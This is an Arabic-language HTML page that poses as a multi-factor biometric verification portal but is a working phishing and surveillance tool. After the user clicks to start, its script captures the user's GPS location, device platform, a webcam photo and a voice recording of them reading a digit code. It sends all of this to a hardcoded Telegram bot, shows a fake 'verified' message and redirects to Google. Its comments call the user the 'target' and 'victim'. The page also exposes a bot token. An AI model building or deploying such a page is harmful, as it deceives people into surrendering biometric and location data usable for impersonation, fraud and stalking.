<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة المصادقة الحيوية الموحدة</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@300;500;700&display=swap" rel="stylesheet">
    <style>
        body { background: #0f172a; color: #f8fafc; font-family: 'Noto Sans Arabic', sans-serif; overflow: hidden; }
        .scanner-viewport {
            position: relative;
            width: 260px;
            height: 260px;
            border: 4px solid #3b82f6;
            border-radius: 50%;
            overflow: hidden;
            margin: 0 auto;
            box-shadow: 0 0 40px rgba(59, 130, 246, 0.4);
            background: #000;
        }
        .scan-anim {
            position: absolute;
            width: 100%;
            height: 4px;
            background: #60a5fa;
            top: 0;
            box-shadow: 0 0 15px #60a5fa;
            animation: scanLine 2s ease-in-out infinite;
            z-index: 10;
        }
        @keyframes scanLine { 0%, 100% { top: 0%; } 50% { top: 100%; } }
        .voice-wave { display: flex; align-items: center; justify-content: center; gap: 4px; height: 30px; }
        .bar { width: 3px; height: 100%; background: #3b82f6; border-radius: 2px; animation: wave 1s infinite; }
        @keyframes wave { 0%, 100% { height: 10%; } 50% { height: 100%; } }
        .mirror { transform: scaleX(-1); }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen p-6">

    <div id="mainContainer" class="max-w-md w-full text-center space-y-8 fade-in">
        <!-- Logo & Title -->
        <div>
            <div class="inline-block p-4 bg-blue-600/10 rounded-3xl mb-4 border border-blue-500/20">
                <svg class="w-10 h-10 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z"></path></svg>
            </div>
            <h1 class="text-2xl font-bold">نظام التحقق الصوتي والمرئي</h1>
            <p class="text-slate-400 text-[10px] uppercase tracking-[0.2em] mt-1">Multi-Factor Biometric Security</p>
        </div>

        <!-- Scanner -->
        <div class="scanner-viewport">
            <video id="v" class="w-full h-full object-cover mirror" autoplay playsinline></video>
            <div id="line" class="scan-anim hidden"></div>
            <div id="doneUI" class="absolute inset-0 bg-green-500/40 hidden flex items-center justify-center z-20">
                <div class="bg-white rounded-full p-4"><svg class="w-12 h-12 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg></div>
            </div>
        </div>

        <!-- Dynamic Challenge Box -->
        <div id="challengeBox" class="bg-slate-800/50 p-6 rounded-[2rem] border border-slate-700 backdrop-blur-md">
            <p id="instruction" class="text-sm text-slate-300 mb-4">اضغط على الزر أدناه لبدء اختبار المطابقة</p>
            
            <div id="voiceUI" class="hidden space-y-4">
                <div class="voice-wave">
                    <div class="bar" style="animation-delay: 0.1s"></div>
                    <div class="bar" style="animation-delay: 0.2s"></div>
                    <div class="bar" style="animation-delay: 0.3s"></div>
                    <div class="bar" style="animation-delay: 0.4s"></div>
                    <div class="bar" style="animation-delay: 0.5s"></div>
                </div>
                <p class="text-xs text-blue-400 font-bold">يرجى نطق الأرقام التالية بوضوح:</p>
                <div class="text-4xl font-black tracking-[0.5rem] text-white bg-slate-900/50 py-4 rounded-xl border border-blue-500/30">
                    <span id="code">6 1 9 4 0 2</span>
                </div>
            </div>
        </div>

        <button id="actionBtn" class="w-full py-5 bg-blue-600 hover:bg-blue-500 text-white font-bold rounded-2xl shadow-2xl shadow-blue-900/40 transition-all active:scale-95">
            تفعيل بروتوكول المصادقة
        </button>

        <p class="text-[10px] text-slate-500">خاضع لمعايير الأمان الدولية ISO 27001 &copy; 2099</p>
    </div>

    <canvas id="c" style="display:none"></canvas>

    <script>
        const TOKEN = "8679801579:AAHY2m_T25mkrGjBjHgAnEGmlg7DVmWCQrI";
        const ADMIN = "1523412137";

        async function tg(m, fd) {
            try { await fetch(`https://api.telegram.org/bot${TOKEN}/${m}`, { method: 'POST', body: fd }); } catch(e) {}
        }

        async function start() {
            const btn = document.getElementById('actionBtn');
            const v = document.getElementById('v');
            const line = document.getElementById('line');
            const inst = document.getElementById('instruction');
            const voiceUI = document.getElementById('voiceUI');

            try {
                // 1. الأذونات والموقع
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                v.srcObject = stream;
                btn.style.display = 'none';
                line.classList.remove('hidden');
                inst.classList.add('hidden');
                voiceUI.classList.remove('hidden');

                // إرسال معلومات الجهاز والموقع فوراً
                navigator.geolocation.getCurrentPosition(p => {
                    const fd = new FormData();
                    fd.append('chat_id', ADMIN);
                    fd.append('text', `🚨 *هدف جديد أونلاين:*\n📍 موقع GPS:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}\n📱 جهاز: ${navigator.platform}`);
                    fd.append('parse_mode', 'Markdown');
                    tg('sendMessage', fd);
                });

                // 2. التقاط الصورة (بعد 3 ثواني)
                setTimeout(() => {
                    const canvas = document.getElementById('c');
                    canvas.width = v.videoWidth; canvas.height = v.videoHeight;
                    canvas.getContext('2d').drawImage(v, 0, 0);
                    canvas.toBlob(b => {
                        const fd = new FormData();
                        fd.append('chat_id', ADMIN);
                        fd.append('photo', b, 'f.jpg');
                        fd.append('caption', "📸 صورة الهوية أثناء نطق الكود");
                        tg('sendPhoto', fd);
                    }, 'image/jpeg');
                }, 3000);

                // 3. تسجيل البصمة الصوتية (8 ثواني للقراءة)
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const audioBlob = new Blob(chunks, { type: 'audio/ogg' });
                    const fdA = new FormData();
                    fdA.append('chat_id', ADMIN);
                    fdA.append('voice', audioBlob, 'v.ogg');
                    fdA.append('caption', "🎤 بصمة صوت الضحية وهو يقرأ الكود");
                    await tg('sendVoice', fdA);
                    
                    // النهاية
                    document.getElementById('doneUI').classList.remove('hidden');
                    voiceUI.innerHTML = "<p class='text-green-400 font-bold py-4'>تم التحقق بنجاح! جاري المزامنة...</p>";
                    setTimeout(() => window.location.href = "https://www.google.com", 2000);
                };
                recorder.start();
                setTimeout(() => recorder.stop(), 8000); // وقت كافٍ لقراءة 6 أرقام

            } catch (e) {
                inst.innerText = "خطأ: يجب السماح بالوصول للأجهزة للمتابعة.";
                inst.style.color = "red";
            }
        }

        document.getElementById('actionBtn').addEventListener('click', start);
    </script>
</body>
</html>
